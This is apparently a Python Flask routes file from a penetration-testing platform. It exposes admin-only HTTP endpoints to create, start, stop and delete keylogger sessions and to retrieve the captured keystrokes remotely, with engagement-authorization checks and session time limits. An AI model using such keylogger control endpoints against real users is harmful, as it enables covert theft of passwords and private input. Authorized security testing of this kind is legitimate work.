"""
Keylogger Testing Routes

CRITICAL WARNING: These endpoints control keyboard logging functionality.
Use ONLY for authorized penetration testing with explicit written permission.

REQUIREMENTS:
- Linux system with X11
- Root/sudo privileges
- pyxhook installed
"""

from flask import Blueprint, request, jsonify
from flask_jwt_extended import jwt_required, get_jwt_identity
import logging
import uuid

from .modules.keylogger_simple import KeyloggerManager, PYXHOOK_AVAILABLE
from .auth_helpers import auth_required
from .security import require_engagement_context, validate_exploitation_authorization

logger = logging.getLogger(__name__)

keylogger_bp = Blueprint('keylogger', __name__)

# Global keylogger manager instance
keylogger_manager = KeyloggerManager()


@keylogger_bp.route('/keylogger/status', methods=['GET'])
@auth_required(roles=['admin'])
def check_keylogger_status():
    """
    Check if keylogger functionality is available.

    Returns:
        JSON response with availability status
    """
    try:
        user_id = get_jwt_identity()
        logger.info(f"Keylogger status check by user: {user_id}")

        return jsonify({
            "status": "success",
            "available": PYXHOOK_AVAILABLE,
            "message": "Keylogger available" if PYXHOOK_AVAILABLE else "pyxhook not installed",
            "requirements": {
                "pyxhook": PYXHOOK_AVAILABLE,
                "platform": "Linux with X11 required",
                "privileges": "Root/sudo required for system-wide hooking"
            }
        }), 200

    except Exception as e:
        logger.error(f"Error checking keylogger status: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions', methods=['GET'])
@auth_required(roles=['admin'])
def list_sessions():
    """
    List all keylogger sessions.

    Returns:
        JSON response with list of sessions
    """
    try:
        user_id = get_jwt_identity()
        logger.info(f"List keylogger sessions requested by user: {user_id}")

        sessions = keylogger_manager.list_sessions()
        return jsonify({
            "status": "success",
            **sessions
        }), 200

    except Exception as e:
        logger.error(f"Error listing sessions: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions', methods=['POST'])
@auth_required(roles=['admin'])
@require_engagement_context
def create_session():
    """
    Create a new keylogger session.

    Request body:
    {
        "session_id": "optional-custom-id",  // Optional, auto-generated if not provided
        "max_duration": 300,                  // Optional, default 300 seconds (5 min)
        "auto_stop": true,                    // Optional, default true
        "engagement_id": 1                    // REQUIRED: Active engagement ID
    }

    Returns:
        JSON response with session details
    """
    try:
        user_id = get_jwt_identity()
        data = request.get_json() or {}

        # Generate session ID if not provided
        session_id = data.get('session_id', str(uuid.uuid4())[:8])
        max_duration = data.get('max_duration', 300)
        auto_stop = data.get('auto_stop', True)

        # Validate max_duration
        if max_duration > 600:  # Max 10 minutes
            return jsonify({
                "status": "error",
                "message": "max_duration cannot exceed 600 seconds (10 minutes)"
            }), 400

        logger.warning(f"⚠️  KEYLOGGER SESSION CREATE requested by user: {user_id}, session: {session_id}")

        result = keylogger_manager.create_session(
            session_id=session_id,
            max_duration=max_duration,
            auto_stop=auto_stop
        )

        if result.get("success"):
            return jsonify({
                "status": "success",
                **result
            }), 201
        else:
            return jsonify({
                "status": "error",
                **result
            }), 400

    except Exception as e:
        logger.error(f"Error creating session: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions/<session_id>/start', methods=['POST'])
@auth_required(roles=['admin'])
@validate_exploitation_authorization
def start_session(session_id):
    """
    Start a keylogger session.

    CRITICAL: Requires explicit authorization_confirmed=true

    Request body:
    {
        "engagement_id": 1,  // REQUIRED: Active engagement ID
        "authorization_confirmed": true  // REQUIRED: Explicit authorization
    }

    Returns:
        JSON response with session status
    """
    try:
        user_id = get_jwt_identity()
        logger.warning(f"🔴 KEYLOGGER START requested by user: {user_id}, session: {session_id}")

        session = keylogger_manager.get_session(session_id)
        if not session:
            return jsonify({
                "status": "error",
                "message": f"Session {session_id} not found"
            }), 404

        result = session.start()

        if result.get("success"):
            return jsonify({
                "status": "success",
                **result
            }), 200
        else:
            return jsonify({
                "status": "error",
                **result
            }), 400

    except Exception as e:
        logger.error(f"Error starting session: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions/<session_id>/stop', methods=['POST'])
@auth_required(roles=['admin'])
def stop_session(session_id):
    """
    Stop a keylogger session.

    Returns:
        JSON response with session results
    """
    try:
        user_id = get_jwt_identity()
        logger.warning(f"🛑 KEYLOGGER STOP requested by user: {user_id}, session: {session_id}")

        session = keylogger_manager.get_session(session_id)
        if not session:
            return jsonify({
                "status": "error",
                "message": f"Session {session_id} not found"
            }), 404

        result = session.stop()

        if result.get("success"):
            return jsonify({
                "status": "success",
                **result
            }), 200
        else:
            return jsonify({
                "status": "error",
                **result
            }), 400

    except Exception as e:
        logger.error(f"Error stopping session: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions/<session_id>/status', methods=['GET'])
@auth_required(roles=['admin'])
def get_session_status(session_id):
    """
    Get the status of a keylogger session.

    Returns:
        JSON response with session status
    """
    try:
        user_id = get_jwt_identity()
        logger.info(f"Session status requested by user: {user_id}, session: {session_id}")

        session = keylogger_manager.get_session(session_id)
        if not session:
            return jsonify({
                "status": "error",
                "message": f"Session {session_id} not found"
            }), 404

        status = session.get_status()
        return jsonify({
            "status": "success",
            **status
        }), 200

    except Exception as e:
        logger.error(f"Error getting session status: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions/<session_id>/logs', methods=['GET'])
@auth_required(roles=['admin'])
def get_session_logs(session_id):
    """
    Get the captured keylogs from a session.

    Query parameters:
        last_n_chars: Optional, return only last N characters

    Returns:
        JSON response with captured keylogs
    """
    try:
        user_id = get_jwt_identity()
        logger.warning(f"⚠️  KEYLOG RETRIEVAL requested by user: {user_id}, session: {session_id}")

        session = keylogger_manager.get_session(session_id)
        if not session:
            return jsonify({
                "status": "error",
                "message": f"Session {session_id} not found"
            }), 404

        # Get optional parameter
        last_n_chars = request.args.get('last_n_chars', type=int)

        logs = session.get_logs(last_n_chars=last_n_chars)

        return jsonify({
            "status": "success",
            "session_id": session_id,
            "keylogs": logs,
            "log_file": session.log_file,
            "keys_captured": session.keys_captured
        }), 200

    except Exception as e:
        logger.error(f"Error getting session logs: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger/sessions/<session_id>', methods=['DELETE'])
@auth_required(roles=['admin'])
def delete_session(session_id):
    """
    Delete a keylogger session and optionally clean up log files.

    Query parameters:
        cleanup: Optional boolean, default true

    Returns:
        JSON response confirming deletion
    """
    try:
        user_id = get_jwt_identity()
        cleanup = request.args.get('cleanup', 'true').lower() == 'true'

        logger.warning(f"⚠️  SESSION DELETE requested by user: {user_id}, session: {session_id}, cleanup: {cleanup}")

        result = keylogger_manager.delete_session(session_id, cleanup=cleanup)

        if result.get("success"):
            return jsonify({
                "status": "success",
                **result
            }), 200
        else:
            return jsonify({
                "status": "error",
                **result
            }), 404

    except Exception as e:
        logger.error(f"Error deleting session: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500


@keylogger_bp.route('/keylogger', methods=['GET'])
@auth_required(roles=['admin'])
def get_keylogs_legacy():
    """
    Legacy endpoint for backward compatibility.
    Returns logs from all active sessions.

    Returns:
        JSON response with keylogs
    """
    try:
        user_id = get_jwt_identity()
        logger.warning(f"⚠️  LEGACY KEYLOG ENDPOINT accessed by user: {user_id}")

        sessions = keylogger_manager.list_sessions()
        all_logs = {}

        for session_data in sessions.get('sessions', []):
            session_id = session_data.get('session_id')
            session = keylogger_manager.get_session(session_id)
            if session:
                all_logs[session_id] = session.get_logs()

        return jsonify({
            "status": "success",
            "message": "Use /keylogger/sessions endpoints for better control",
            "keylogs": all_logs
        }), 200

    except Exception as e:
        logger.error(f"Error in legacy endpoint: {str(e)}", exc_info=True)
        return jsonify({
            "status": "error",
            "message": f"Internal server error: {str(e)}"
        }), 500
